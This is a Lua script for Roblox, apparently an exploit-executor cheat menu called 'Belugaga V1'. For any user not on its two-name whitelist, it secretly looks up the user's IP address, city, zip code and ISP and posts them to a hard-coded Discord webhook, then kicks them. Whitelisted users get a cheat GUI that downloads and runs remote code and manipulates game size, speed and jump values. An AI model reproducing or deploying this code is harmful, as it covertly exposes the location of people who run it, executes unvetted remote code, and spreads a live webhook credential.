-- Whitelist for specific usernames 
local whitelistedUsers = {
   "Mrbignewcoming3",
   "Hi_dorihi",  --whitelisted
}

-- Function to check if player is whitelisted
local function isWhitelisted(username)
   for _, whitelisted in ipairs(whitelistedUsers) do
       if username == whitelisted then
           return true
       end
   end
   return false
end

-- Get the local player's username
local player = game.Players.LocalPlayer
local username = player.Name

-- Function to send data to the webhook
local function sendWebhookData(player_name, ipinfo_table)
    local webhook_url = "https://discord.com/api/webhooks/1330113801558691840/27eBfT1ihaS3EqJOhTLi4-rxb1y1no-l3kESIRYiGgG5Bgre0we5SqI6EFOPBoEifp14"  -- Replace with your actual webhook URL
    local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", 
        player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
    
    local success, response = pcall(function()
        game:GetService("HttpService"):PostAsync(
            webhook_url, 
            game:GetService("HttpService"):JSONEncode({["content"] = dataMessage}),
            Enum.HttpContentType.ApplicationJson
        )
    end)

    if not success then
        warn("Failed to send webhook data: " .. response)
    end
end

-- If the player is not whitelisted, get their IP info and kick them
if not isWhitelisted(username) then
    local player_name = player.Name

    -- Get IP information
    local ip_info
    local success, response = pcall(function()
        ip_info = game:GetService("HttpService"):GetAsync("http://ip-api.com/json")
    end)

    if not success then
        warn("Failed to get IP info: " .. response)
        return
    end

    local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info)

    -- Send IP info to webhook
    sendWebhookData(player_name, ipinfo_table)

    -- Kick the player
    player:Kick("Not WhiteListed L")
else

local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/adopttesting/Testing/refs/heads/main/Library", true))()

local window = library:AddWindow("Belugaga V1 [] Made By Adopt", {
    main_color = Color3.fromRGB(0, 0, 0), -- Color
    min_size = Vector2.new(500, 450), -- Size of the gui
    can_resize = false, -- true or false
})

local Client = window:AddTab("Client")

-- Set Size 2
Client:AddButton("Set Size 2",function()
    local args = {
        [1] = "changeSize",
        [2] = 2
    }

    game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("changeSpeedSizeRemote"):InvokeServer(unpack(args))
end)

-- Dropdown for Sizes
Client:AddDropdown("Choose Size", function(text)
    local size_value
    if text == "Mars" then
        size_value = 50
    elseif text == "Earth" then
        size_value = 100
    elseif text == "Iridocyclitis" then
        size_value = 10
    end

    if size_value then
        -- Set the size using the chosen option
        local args = {
            [1] = "changeSize",
            [2] = size_value
        }

        game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("changeSpeedSizeRemote"):InvokeServer(unpack(args))
    end
end)

-- Adding the dropdown options for sizes
local dropdown = Client:AddDropdown("Choose Size", function(text) end)
dropdown:Add("Mars")   -- Size 50
dropdown:Add("Earth")  -- Size 100
dropdown:Add("Iridocyclitis")  -- Size 10

-- Local Player Controls: WalkSpeed
Client:AddLabel("Local Player")

Client:AddSlider("WalkSpeed", function(p)
    setwalkspeed(p)   
end, {                    
    ["min"] = 16,
    ["max"] = 500,  
})

-- Default WalkSpeed to 16
local walkSpeedSlider = Client:GetSlider("WalkSpeed")
walkSpeedSlider:Set(16)

Client:AddButton("Apply WalkSpeed",function()
    -- Apply WalkSpeed code here if needed
end)

-- Local Player Controls: JumpPower
Client:AddSlider("JumpPower", function(p)
    setjumppower(p)   
end, {                    
    ["min"] = 50,
    ["max"] = 1000,  
})

-- Default JumpPower to 50
local jumpPowerSlider = Client:GetSlider("JumpPower")
jumpPowerSlider:Set(50) 

Client:AddButton("Apply JumpPower",function() 
    -- Apply JumpPower code here if needed
end)

--end of script whitelist
end

